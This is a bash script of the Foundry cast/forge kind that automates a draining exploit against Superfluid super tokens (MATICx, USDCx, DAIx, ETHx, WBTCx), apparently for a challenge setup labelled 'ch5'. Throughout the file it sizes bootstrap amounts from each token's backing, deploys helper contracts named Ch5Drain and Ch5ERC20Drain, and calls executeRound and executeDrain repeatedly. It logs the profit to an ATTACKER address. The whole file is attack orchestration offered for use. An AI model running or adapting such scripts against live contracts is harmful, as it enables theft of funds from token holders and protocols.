#!/bin/bash
set -euo pipefail
source ../../.env >/dev/null 2>&1
RPC="$RPC_CH5_SUPERFLUID_V2"
ATTACKER="$PUBLIC_ADDRESS"
LOG="runs/exploit_1776535427.log"
PASSFILE="runs/.ch5_keystore_password"
KEYSTORE="runs/keystore/ch5tmp"
MATICX="0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
ROUTER="0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"
WMATIC="0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"
USDCX="0xCAa7349CEA390F89641fe306D93591f87595dc1F"
DAIX="0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2"
ETHX="0x27e1e4E6BC79D93032abef01025811B7E4727e85"
WBTCX="0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92"
GAS_RESERVE=5000000000000000000
NATIVE_GAS_RESERVE=20000000000000000
NATIVE_BACKING_MARGIN=1000000000
PRE_BAL=$(cast balance "$ATTACKER" --rpc-url "$RPC")
echo "=== manual broadcast $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a "$LOG"
echo "pre_balance=$PRE_BAL" | tee -a "$LOG"

tx_hashes=()

quote_out() {
  local amt="$1"
  local underlying="$2"
  cast call "$ROUTER" 'getAmountsOut(uint256,address[])(uint256[])' "$amt" "[$WMATIC,$underlying]" --rpc-url "$RPC" --json | jq -r '.[0][1]'
}

compute_native_seed() {
  python3 - <<PY
attacker=int('$1')
backing=int('$2')
res=$NATIVE_GAS_RESERVE
margin=$NATIVE_BACKING_MARGIN
if attacker <= res:
    print(0)
else:
    spendable=attacker-res
    safe=backing//10
    if safe <= margin:
        print(0)
    else:
        safe -= margin
        print(spendable if spendable < safe else safe)
PY
}

bootstrap_for_target() {
  local target="$1"
  local max_native="$2"
  local floor="$3"
  local underlying="$4"
  if [ "$target" -le 0 ] || [ "$max_native" -le 0 ]; then
    echo 0
    return
  fi
  local quoted_max
  quoted_max=$(quote_out "$max_native" "$underlying")
  local result
  if [ "$quoted_max" -le "$target" ]; then
    result="$max_native"
  else
    local low=1
    local high="$max_native"
    local i=0
    while [ "$low" -lt "$high" ] && [ $i -lt 40 ]; do
      local mid=$(( low + (high - low) / 2 ))
      local quoted
      quoted=$(quote_out "$mid" "$underlying")
      if [ "$quoted" -ge "$target" ]; then
        high="$mid"
      else
        low=$(( mid + 1 ))
      fi
      i=$(( i + 1 ))
    done
    result=$(( low + low / 20 + 100000000000000000 ))
  fi
  if [ "$result" -lt "$floor" ]; then result="$floor"; fi
  if [ "$result" -gt "$max_native" ]; then result="$max_native"; fi
  echo "$result"
}

deploy_contract() {
  local contract="$1"
  shift
  local out json addr tx
  out=$(forge create "$contract" --broadcast --json --rpc-url "$RPC" --keystore "$KEYSTORE" --password-file "$PASSFILE" "$@" 2>&1 | tee -a "$LOG")
  json=$(printf '%s\n' "$out" | sed -n '/^{/,$p')
  addr=$(printf '%s\n' "$json" | jq -r '.deployedTo')
  tx=$(printf '%s\n' "$json" | jq -r '.transactionHash')
  tx_hashes+=("$tx")
  printf '%s\n' "$addr"
}

send_tx() {
  local gas_limit="$1"
  local value="$2"
  local to="$3"
  local sig="$4"
  shift 4
  local out json tx
  out=$(cast send --gas-limit "$gas_limit" --value "$value" --json --rpc-url "$RPC" --keystore "$KEYSTORE" --password-file "$PASSFILE" "$to" "$sig" "$@" 2>&1 | tee -a "$LOG")
  json=$(printf '%s\n' "$out" | sed -n '/^{/,$p')
  tx=$(printf '%s\n' "$json" | jq -r '.transactionHash')
  tx_hashes+=("$tx")
}

run_token() {
  local label="$1"
  local supertoken="$2"
  local index_base="$3"
  local floor="$4"
  local underlying backing native spendable target bootstrap helper post_backing post_balance
  underlying=$(cast call "$supertoken" 'getUnderlyingToken()(address)' --rpc-url "$RPC")
  backing=$(cast call "$underlying" 'balanceOf(address)(uint256)' "$supertoken" --rpc-url "$RPC" --json | jq -r '.[0]')
  native=$(cast balance "$ATTACKER" --rpc-url "$RPC")
  spendable=$(( native - GAS_RESERVE ))
  target=$(( backing / 12 ))
  bootstrap=$(bootstrap_for_target "$target" "$spendable" "$floor" "$underlying")
  echo "$label native=$native backing=$backing target=$target bootstrap=$bootstrap underlying=$underlying" | tee -a "$LOG"
  helper=$(deploy_contract exploit/Run.s.sol:Ch5ERC20Drain --constructor-args "$supertoken" "$ROUTER" "$index_base")
  echo "$label helper=$helper" | tee -a "$LOG"
  send_tx 12000000 "$bootstrap" "$helper" 'executeDrain(uint256,uint256)' 1 10
  sleep 2
  post_balance=$(cast balance "$ATTACKER" --rpc-url "$RPC")
  post_backing=$(cast call "$underlying" 'balanceOf(address)(uint256)' "$supertoken" --rpc-url "$RPC" --json | jq -r '.[0]')
  echo "$label post_balance=$post_balance post_backing=$post_backing" | tee -a "$LOG"
}

BAL=$(cast balance "$ATTACKER" --rpc-url "$RPC")
BACKING=$(cast balance "$MATICX" --rpc-url "$RPC")
SEED=$(compute_native_seed "$BAL" "$BACKING")
if [ "$SEED" -gt 0 ]; then
  HELPER1=$(deploy_contract exploit/Run.s.sol:Ch5Drain)
  echo "native_helper1=$HELPER1" | tee -a "$LOG"
  for round in 1 2 3 4; do
    BAL=$(cast balance "$ATTACKER" --rpc-url "$RPC")
    BACKING=$(cast balance "$MATICX" --rpc-url "$RPC")
    SEED=$(compute_native_seed "$BAL" "$BACKING")
    echo "native_round=$round balance=$BAL backing=$BACKING seed=$SEED" | tee -a "$LOG"
    if [ "$SEED" -le 0 ]; then break; fi
    send_tx 5000000 "$SEED" "$HELPER1" 'executeRound(uint256)' 10
    sleep 2
  done
  BAL=$(cast balance "$ATTACKER" --rpc-url "$RPC")
  BACKING=$(cast balance "$MATICX" --rpc-url "$RPC")
  SEED=$(compute_native_seed "$BAL" "$BACKING")
  echo "native_phase2_check balance=$BAL backing=$BACKING seed=$SEED" | tee -a "$LOG"
  if [ "$SEED" -gt 0 ]; then
    HELPER2=$(deploy_contract exploit/Run.s.sol:Ch5Drain)
    echo "native_helper2=$HELPER2" | tee -a "$LOG"
    send_tx 5000000 "$SEED" "$HELPER2" 'executeRound(uint256)' 10
    sleep 2
  fi
else
  echo "native stage skipped balance=$BAL backing=$BACKING seed=$SEED" | tee -a "$LOG"
fi
post_native=$(cast balance "$ATTACKER" --rpc-url "$RPC")
echo "post_native_balance=$post_native" | tee -a "$LOG"

run_token USDCx "$USDCX" 520000000 250000000000000000000
run_token DAIx "$DAIX" 530000000 250000000000000000000
run_token ETHx "$ETHX" 535000000 250000000000000000000
run_token WBTCx "$WBTCX" 540000000 250000000000000000000

POST_BAL=$(cast balance "$ATTACKER" --rpc-url "$RPC")
DELTA=$(( POST_BAL - PRE_BAL ))
echo "post_balance=$POST_BAL delta=$DELTA" | tee -a "$LOG"
printf '%s\n' "${tx_hashes[@]}" > runs/.exploit_1776535427_tx_hashes
